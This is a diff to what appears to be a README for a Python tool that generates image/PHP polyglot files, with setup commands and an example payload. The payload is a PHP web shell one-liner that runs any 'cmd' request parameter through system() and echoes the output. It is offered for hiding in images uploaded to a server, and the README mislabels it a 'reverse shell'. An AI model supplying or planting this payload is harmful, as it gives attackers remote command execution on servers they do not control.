@@ -10,12 +10,12 @@ First Polyglot Generator written in python (image file + php command)
 
 # Set Up
 Install PIL module
-$ pip install Pillow piexif
+```$ pip install Pillow piexif```
 
 Run the file
-$ python3 polyglotGenerator.py
+```$ python3 polyglotGenerator.py```
 
 Example of the PHP reverse shell command that can used
-$ <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; } __HALT_COMPILER();?>
+```$ <?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; } __HALT_COMPILER();?>```
 
 
